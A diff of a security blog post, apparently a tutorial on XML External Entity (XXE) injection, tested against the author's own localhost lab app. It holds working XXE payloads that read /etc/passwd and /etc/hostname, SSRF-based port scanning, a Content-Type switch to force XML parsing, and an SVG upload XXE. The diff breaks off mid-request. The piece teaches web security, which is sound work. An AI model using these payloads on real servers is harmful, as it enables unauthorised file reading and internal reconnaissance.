@@ -67,8 +67,8 @@ html {
 <meta property="og:description" content="Exploiting misconfigured XML parsers" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lazarpostenje.github.io/posts/xml-external-entity-injection/" /><meta property="og:image" content="https://lazarpostenje.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-12-27T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-12-27T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2021-12-28T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-12-28T00:00:00&#43;00:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://lazarpostenje.github.io/papermod-cover.png"/>
@@ -107,11 +107,11 @@ html {
   "keywords": [
     "OSWE", "Web hacking", "CTF", "XXE", "SSRF"
   ],
-  "articleBody": "What is XML? XML is a shorthand of eXtensible Markup Language which is very simple but flexible text format used to electronically share structured data via internet. XML is a markup language based on SGML - a language which is describing other languages.\nHow does it work? XML is very strict about formatting, meaning that if the formatting is off, programs that rely on it will return an error. All valid XML documents consist of elements (element - container of data). The syntax itself reminds of HTML tags - the beginning of an element is identified by opening and the end is identified by closing tags, with other elements between them or plain text.\nExample of well-formed XML document    Lazar V  19 Serbia  As you can see, elements can be inside of each other or as it is called nested elements. On the first line the XML version and encoding is specified.\nWhat is DTD? DTD or Document Type Definition is a way to describe XML language more precisely. It is used to check if the XML document is valid or not based on a set of rules. DTD can be specified inside of the document, or specified on a remote location (external DTD)\nExample of well-formed XML document with local DTD        ]   Lazar V  19 Serbia  ",
-  "wordCount" : "252",
+  "articleBody": "If you are already familiar with XML and DTD, feel free to skip to the fun part.\nWhat is XML? XML is a shorthand for eXtensible Markup Language which is a very simple but flexible text format used to electronically share structured data via the internet. XML is a markup language based on SGML - a language which is describing other languages.\nHow does it work? XML is very strict about formatting, meaning that if the formatting is off, programs that rely on it will return an error. All valid XML documents consist of elements (element - container of data). The syntax itself reminds of HTML tags - the beginning of an element is identified by opening and the end is identified by closing tags, with other elements between them or plain text.\nExample of well-formed XML document    Lazar V  19 Serbia  As you can see, elements can be inside of each other or as it is called nested elements. On the first line the XML version and encoding is specified.\nWhat is DTD? DTD or Document Type Definition is a way to describe XML language more precisely. It is used to check if the XML document is valid or not based on a set of rules. DTD can be specified inside of the document, or specified on a remote location (external DTD)\nExample of well-formed XML document with local DTD        ]   Lazar V  19 Serbia  Here we define a basic DTD describing the structure of the document. However, we can also declare an external DTD:\n    Lazar V  19 Serbia   line requested pentester.dtd file on local system, including all DTD declarations within:\nContents of pentester.dtd:\n       XXE Injection XXE injection or XML External Entity injection is a web security vulnerability where an attacker takes advantage of a misconfigured XML parser and allows him to interfere with an application’s processing of XML data.\nWhat is the impact? If properly executed, XXE injection can allow the attacker to:\n Read files on the web server filesystem Issue GET HTTP requests as the webserver a.k.a. SSRF Interact with any back-end or external systems the application can access Scan internal hosts' ports Execute application level DoS  XML Entities The XML Entity is a concept defined by the XML 1.0 standard which is a storage unit of some type (similar to a variable in programming languages).\nXML allows custom entities to be defined within the DTD for example:\n ] Entities can be “executed”, or, simply put, referenced to using the following syntax:\n\u0026firstname; where firstname is the name of the entity we are referencing to. This basically means replacing \u0026firstname; with the actual defined content of the entity, in this case Lazar.\nXML External Entities XML external entities are a type of special entity whose definition is located outside of the DTD where it is declared. Declaration of the external entity uses SYSTEM keyword used to specify URL to the content which you’d like to put into the entity. For example:\n ] In this case, the contents entity will hold the contents of my website, a.k.a. the HTML. This is where we can issue GET requests to remote or internal locations as the webserver.\nReading files URL can use file:// protocol, which allows us to load file contents into the entity itself:\n ] In this case contents entity holds the value of /etc/passwd file of the webserver.\n Exploiting XXE to retrieve files Disclaimer I am using a custom web app which I’ve built to demonstrate the techniques below. For practice, you can refer to PortSwigger Web Security Academy for free labs. (They’re great!)\nAlso, I am using BurpSuite to intercept and modify web traffic.\nHere I have an application which uses /post/getlikes endpoint to show the number of likes of certain post. POST request looks like this:\nPOST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/xml   56  Which returns the following response:\nHTTP/1.1 200 OK Content-Type: text/plain; charset=utf-8 Connection: close 138 As we can see, some data is displayed to us and we can try using the classic file read XXE attack. The steps would be:\n Define local DTD Define an external entity which holds the value of some file Reference to the entity in postID element  POST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/xml   ]  \u0026file;  Here I stored /etc/hostname contents to file entity, and referenced it inside postID element. The request returns us the following response:\nHTTP/1.1 400 Bad Request Content-Type: application/json; charset=utf-8 Connection: close \"Error: Invalid post ID: ubuntu \" Even though we got error 400 and XML error, we can still see the hostname is ubuntu, which means we successfully extracted the contents.\nPort scanning The technique to scan ports is pretty straightforward, as you can simply set the content of an external entity to a http://host:port and compare response timing. Usually, if the response takes longer than usual to arrive, that means the port is open.\nConsider the following request to /post/getlikes endpoint:\nPOST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/xml   ]  \u0026file;  The request took 3 milliseconds to arrive. (Probably opened)\nPOST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/xml   ]  \u0026file;  This time the response took 50ms to arrive. (Most likely closed).\nNote - Port scanning isn’t always a reliable technique as it might generate false positives or not work at all.\nForcing the back-end to use XML instead of JSON Sometimes, the back-end of a web application encodes your input into JSON before sending it to the server. For us as attackers, this isn’t suitable and we need to try to force it to parse XML so we can inject entities.\nIf the webserver has some kind of XML parser but doesn’t use it by default, we can try switching Content-Type request header from application/json to application/xml.\nConsider the following request:\nPOST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/json {\"post\": {\"postID\" : 4}} We can try switching the above mentioned header to application/xml:\nPOST /post/getlikes HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/xml   ]  \u0026file;  The response:\nHTTP/1.1 400 Bad Request Content-Type: application/json; charset=utf-8 Connection: close \"Error: Invalid post ID: rootːx:0:0:root:/root:/usr/bin/zsh daemonːx:1:1:daemon:/usr/sbin:/usr/sbin/nologin binːx:2:2:bin:/bin:/usr/sbin/nologin sysːx:3:3:sys:/dev:/usr/sbin/nologin syncːx:4:65534:sync:/bin:/bin/sync gamesːx:5:60:games:/usr/games:/usr/sbin/nologin man:ːx:6:12ːman:/var/cache/man:/usr/sbin/nologin lpːx:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailːx:8:8:mail:/var/mail:/usr/sbin/nologin newsːx:9:9:news:/var/spool/news:/usr/sbin/nologin \" Reading files using file upload functionality In this case, the web application parses the user-uploaded file and sets it as a profile picture. The application expects JPEG or PNG file but does not exclude SVG file type which contains actual XML data. Here we can try to embed our entity.\nConsider /profile/uploadProfilePicture endpoint:\nPOST /profile/uploadProfilePicture HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGHJEwyDDxcNQ6BJ7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 ------WebKitFormBoundaryGHJEwyDDxcNQ6BJ7 Content-Disposition: form-data; name=\"profilePicture\"; filename=\"picture.png\" Content-Type: image/png PNG \u001a We can change couple of things here:\nPOST /profile/uploadProfilePicture HTTP/1.1 Host: localhost Cookie: session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGHJEwyDDxcNQ6BJ7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 ------WebKitFormBoundaryGHJEwyDDxcNQ6BJ7 Content-Disposition: form-data; name=\"profilePicture\"; filename=\"picture.svg\" Content-Type: application/xml ] \u0026xxe; I changed:\n Content-Type HTTP header to application/xml filename parameter value to image.svg  After sending the request, I got the following response:\nHTTP/1.1 302 Found Location: /profile Connection: close Content-Length: 0 The response doesn’t contain content of /etc/hostname? No problem. The XML parser didn’t reflect it in response, but in the image itself, because that’s how SVG and XML work.\nDownloading the image from http://localhost/files/profilePictures/fhfbahasfiafs.png:\nAs you can see, the hostname ubuntu is written on the PNG itself.\n Blind XXE As this post is already quite long, I’ll write about blind XXE techniques next week, where we’ll cover more advanced Out-Of-Band (OOB) content extraction and Application-level Denial Of Service.\n",
+  "wordCount" : "1494",
   "inLanguage": "en",
-  "datePublished": "2021-12-27T00:00:00Z",
-  "dateModified": "2021-12-27T00:00:00Z",
+  "datePublished": "2021-12-28T00:00:00Z",
+  "dateModified": "2021-12-28T00:00:00Z",
   "author":{
     "@type": "Person",
     "name": "Lazar"
@@ -222,7 +222,7 @@ particlesJS("particles-js", {
     <div class="post-description">
       Exploiting misconfigured XML parsers
     </div>
-    <div class="post-meta">December 27, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Lazar
+    <div class="post-meta">December 28, 2021&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Lazar
 </div>
   </header> <div class="toc">
     <details >
@@ -245,18 +245,48 @@ particlesJS("particles-js", {
                         <ul>
                         
                 <li>
-                    <a href="#example-of-well-formed-xml-document-with-local-dtd" aria-label="Example of well-formed XML document with local DTD">Example of well-formed XML document with local DTD</a>
+                    <a href="#example-of-well-formed-xml-document-with-local-dtd" aria-label="Example of well-formed XML document with local DTD">Example of well-formed XML document with local DTD</a></li></ul>
+                    </ul>
                 </li>
-            </ul>
-            </ul>
-            </li>
+                <li>
+                    <a href="#xxe-injection" aria-label="XXE Injection">XXE Injection</a><ul>
+                        
+                <li>
+                    <a href="#what-is-the-impact" aria-label="What is the impact?">What is the impact?</a><ul>
+                        
+                <li>
+                    <a href="#xml-entities" aria-label="XML Entities">XML Entities</a></li>
+                <li>
+                    <a href="#xml-external-entities" aria-label="XML External Entities">XML External Entities</a><ul>
+                        
+                <li>
+                    <a href="#reading-files" aria-label="Reading files">Reading files</a></li></ul>
+                </li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#exploiting-xxe-to-retrieve-files" aria-label="Exploiting XXE to retrieve files">Exploiting XXE to retrieve files</a><ul>
+                        
+                <li>
+                    <a href="#disclaimer" aria-label="Disclaimer">Disclaimer</a></li></ul>
+                </li>
+                <li>
+                    <a href="#port-scanning" aria-label="Port scanning">Port scanning</a></li>
+                <li>
+                    <a href="#forcing-the-back-end-to-use-xml-instead-of-json" aria-label="Forcing the back-end to use XML instead of JSON">Forcing the back-end to use XML instead of JSON</a></li>
+                <li>
+                    <a href="#reading-files-using-file-upload-functionality" aria-label="Reading files using file upload functionality">Reading files using file upload functionality</a></li>
+                <li>
+                    <a href="#blind-xxe" aria-label="Blind XXE">Blind XXE</a>
+                </li>
             </ul>
         </div>
     </details>
 </div>
 
-  <div class="post-content"><h1 id="what-is-xml">What is XML?<a hidden class="anchor" aria-hidden="true" href="#what-is-xml">#</a></h1>
-<p><strong>XML</strong> is a shorthand of <em>eXtensible Markup Language</em> which is very simple but flexible text format used to electronically share structured data via internet. XML is a markup language based on <a href="https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language">SGML</a> - a language which is describing other languages.</p>
+  <div class="post-content"><p>If you are already familiar with XML and DTD, feel free to skip to <a href="#exploiting-xxe-to-retrieve-files">the fun part</a>.</p>
+<h1 id="what-is-xml">What is XML?<a hidden class="anchor" aria-hidden="true" href="#what-is-xml">#</a></h1>
+<p><strong>XML</strong> is a shorthand for <em>eXtensible Markup Language</em> which is a very simple but flexible text format used to electronically share structured data via the internet. XML is a markup language based on <a href="https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language">SGML</a> - a language which is describing other languages.</p>
 <h2 id="how-does-it-work">How does it work?<a hidden class="anchor" aria-hidden="true" href="#how-does-it-work">#</a></h2>
 <p>XML is very strict about formatting, meaning that if the formatting is off, programs that rely on it will return an error. All valid XML documents consist of <em>elements</em> (<em>element</em> - container of data). The syntax itself reminds of <strong>HTML</strong> tags - the beginning of an element is identified by opening and the end is identified by closing tags, with other elements between them or plain text.</p>
 <h3 id="example-of-well-formed-xml-document">Example of well-formed XML document<a hidden class="anchor" aria-hidden="true" href="#example-of-well-formed-xml-document">#</a></h3>
@@ -292,7 +322,217 @@ particlesJS("particles-js", {
 	<span style="color:#f92672">&lt;age&gt;</span>19<span style="color:#f92672">&lt;/age&gt;</span>
 	<span style="color:#f92672">&lt;country&gt;</span>Serbia<span style="color:#f92672">&lt;/country&gt;</span>
 <span style="color:#f92672">&lt;/pentester&gt;</span>
-</code></pre></div>
+</code></pre></div><p>Here we define a basic <em>DTD</em> describing the structure of the document. However, we can also declare <em>an external DTD</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE pentester SYSTEM &#34;pentester.dtd&#34;&gt;</span>
+<span style="color:#f92672">&lt;pentester&gt;</span>
+	<span style="color:#f92672">&lt;name&gt;</span>
+		<span style="color:#f92672">&lt;first&gt;</span>Lazar<span style="color:#f92672">&lt;/first&gt;</span>
+		<span style="color:#f92672">&lt;last&gt;</span>V<span style="color:#f92672">&lt;/last&gt;</span>
+	<span style="color:#f92672">&lt;/name&gt;</span>
+	<span style="color:#f92672">&lt;age&gt;</span>19<span style="color:#f92672">&lt;/age&gt;</span>
+	<span style="color:#f92672">&lt;country&gt;</span>Serbia<span style="color:#f92672">&lt;/country&gt;</span>
+<span style="color:#f92672">&lt;/pentester&gt;</span>
+</code></pre></div><p><code>&lt;!DOCTYPE pentester SYSTEM &quot;pentester.dtd&quot;&gt;</code> line requested <code>pentester.dtd</code> file on local system, including all DTD declarations within:</p>
+<p>Contents of <code>pentester.dtd</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ELEMENT pentester (name,age,country)&gt;</span>
+<span style="color:#75715e">&lt;!ELEMENT name (first,last)&gt;</span>
+<span style="color:#75715e">&lt;!ELEMENT first (#PCDATA)&gt;</span>
+<span style="color:#75715e">&lt;!ELEMENT last (#PCDATA)&gt;</span>
+<span style="color:#75715e">&lt;!ELEMENT age (#PCDATA)&gt;</span>
+<span style="color:#75715e">&lt;!ELEMENT country (#PCDATA)&gt;</span>
+</code></pre></div><hr>
+<h1 id="xxe-injection">XXE Injection<a hidden class="anchor" aria-hidden="true" href="#xxe-injection">#</a></h1>
+<p><strong>XXE</strong> injection or <strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity injection is a web security vulnerability where an attacker takes advantage of a misconfigured XML parser and allows him to interfere with an application&rsquo;s processing of XML data.</p>
+<h2 id="what-is-the-impact">What is the impact?<a hidden class="anchor" aria-hidden="true" href="#what-is-the-impact">#</a></h2>
+<p>If properly executed, <em>XXE</em> injection can allow the attacker to:</p>
+<ul>
+<li>Read files on the web server filesystem</li>
+<li>Issue <em>GET HTTP</em> requests as the webserver a.k.a. <strong>SSRF</strong></li>
+<li>Interact with any back-end or external systems the application can access</li>
+<li>Scan internal hosts' ports</li>
+<li>Execute application level <em>DoS</em></li>
+</ul>
+<h3 id="xml-entities">XML Entities<a hidden class="anchor" aria-hidden="true" href="#xml-entities">#</a></h3>
+<p>The XML Entity is a concept defined by the XML 1.0 standard which is a storage unit of some type (similar to a variable in programming languages).</p>
+<p>XML allows custom entities to be defined within the DTD for example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE example [
+</span><span style="color:#75715e">	&lt;!ENTITY firstname &#34;Lazar&#34;&gt;</span>
+]&gt;
+</code></pre></div><p>Entities can be &ldquo;executed&rdquo;, or, simply put, referenced to using the following syntax:<br>
+<code>&amp;firstname;</code> where <code>firstname</code> is the name of the entity we are referencing to. This basically means replacing <code>&amp;firstname;</code> with the actual defined content of the entity, in this case <code>Lazar</code>.</p>
+<h3 id="xml-external-entities">XML External Entities<a hidden class="anchor" aria-hidden="true" href="#xml-external-entities">#</a></h3>
+<p>XML external entities are a type of special entity whose definition is located outside of the DTD where it is declared. Declaration of the external entity uses <code>SYSTEM</code> keyword used to specify <code>URL</code> to the content which you&rsquo;d like to put into the entity. For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY contents SYSTEM &#34;https://lazarv.com&#34;&gt;</span> ]&gt;
+</code></pre></div><p>In this case, the <code>contents</code> entity will hold the contents of my website, a.k.a. the HTML. This is where we can issue GET requests to remote or internal locations as the webserver.</p>
+<h4 id="reading-files">Reading files<a hidden class="anchor" aria-hidden="true" href="#reading-files">#</a></h4>
+<p>URL can use <code>file://</code> protocol, which allows us to load file contents into the entity itself:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY contents SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</code></pre></div><p>In this case <code>contents</code> entity holds the value of <code>/etc/passwd</code> file of the webserver.</p>
+<hr>
+<h1 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files<a hidden class="anchor" aria-hidden="true" href="#exploiting-xxe-to-retrieve-files">#</a></h1>
+<h2 id="disclaimer">Disclaimer<a hidden class="anchor" aria-hidden="true" href="#disclaimer">#</a></h2>
+<p>I am using a custom web app which I&rsquo;ve built to demonstrate the techniques below. For practice, you can refer to <a href="https://portswigger.net/web-security">PortSwigger Web Security Academy</a> for <strong>free</strong> labs. (They&rsquo;re great!)</p>
+<p>Also, I am using BurpSuite to intercept and modify web traffic.</p>
+<p>Here I have an application which uses <em>/post/getlikes</em> endpoint to show the number of likes of certain post. POST request looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#f92672">&lt;post&gt;</span>
+	<span style="color:#f92672">&lt;postID&gt;</span>56<span style="color:#f92672">&lt;/postID&gt;</span>
+<span style="color:#f92672">&lt;/post&gt;</span>
+</code></pre></div><p>Which returns the following response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/plain; charset=utf-8</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+
+<span style="color:#960050;background-color:#1e0010">138</span>
+</code></pre></div><p>As we can see, some data is displayed to us and we can try using the classic file read XXE attack. The steps would be:</p>
+<ul>
+<li>Define local DTD</li>
+<li>Define an external entity which holds the value of some file</li>
+<li>Reference to the entity in <code>postID</code> element</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM &#34;file:///etc/hostname&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;post&gt;</span>
+	<span style="color:#f92672">&lt;postID&gt;</span>&amp;file;<span style="color:#f92672">&lt;/postID&gt;</span>
+<span style="color:#f92672">&lt;/post&gt;</span>
+</code></pre></div><p>Here I stored <code>/etc/hostname</code> contents to <code>file</code> entity, and referenced it inside <code>postID</code> element. The request returns us the following response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">400</span> <span style="color:#a6e22e">Bad Request</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json; charset=utf-8</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+
+<span style="color:#e6db74">&#34;Error: Invalid post ID: ubuntu
+</span><span style="color:#e6db74">&#34;</span>
+</code></pre></div><p>Even though we got error 400 and XML error, we can still see the hostname is <code>ubuntu</code>, which means we successfully extracted the contents.</p>
+<h1 id="port-scanning">Port scanning<a hidden class="anchor" aria-hidden="true" href="#port-scanning">#</a></h1>
+<p>The technique to scan ports is pretty straightforward, as you can simply set the content of an external entity to a <code>http://host:port</code> and compare response timing. Usually, if the response takes longer than usual to arrive, that means the port is open.</p>
+<p>Consider the following request to <code>/post/getlikes</code> endpoint:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM &#34;http://localhost:8080&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;post&gt;</span>
+	<span style="color:#f92672">&lt;postID&gt;</span>&amp;file;<span style="color:#f92672">&lt;/postID&gt;</span>
+<span style="color:#f92672">&lt;/post&gt;</span>
+</code></pre></div><p>The request took 3 milliseconds to arrive. (Probably opened)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml</span>
+
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM &#34;http://localhost:5050&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;post&gt;</span>
+	<span style="color:#f92672">&lt;postID&gt;</span>&amp;file;<span style="color:#f92672">&lt;/postID&gt;</span>
+<span style="color:#f92672">&lt;/post&gt;</span>
+</code></pre></div><p>This time the response took 50ms to arrive. (Most likely closed).</p>
+<p><strong>Note</strong> - Port scanning isn&rsquo;t always a reliable technique as it might generate false positives or not work at all.</p>
+<h1 id="forcing-the-back-end-to-use-xml-instead-of-json">Forcing the back-end to use XML instead of JSON<a hidden class="anchor" aria-hidden="true" href="#forcing-the-back-end-to-use-xml-instead-of-json">#</a></h1>
+<p>Sometimes, the back-end of a web application encodes your input into JSON before sending it to the server. For us as attackers, this isn&rsquo;t suitable and we need to try to force it to parse XML so we can inject entities.</p>
+<p>If the webserver has some kind of XML parser but doesn&rsquo;t use it by default, we can try switching <code>Content-Type</code> request header from <code>application/json</code> to <code>application/xml</code>.</p>
+<p>Consider the following request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+
+{<span style="color:#f92672">&#34;post&#34;</span>: {<span style="color:#f92672">&#34;postID&#34;</span> : <span style="color:#ae81ff">4</span>}}
+</code></pre></div><p>We can try switching the above mentioned header to <code>application/xml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /post/getlikes <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml</span>
+
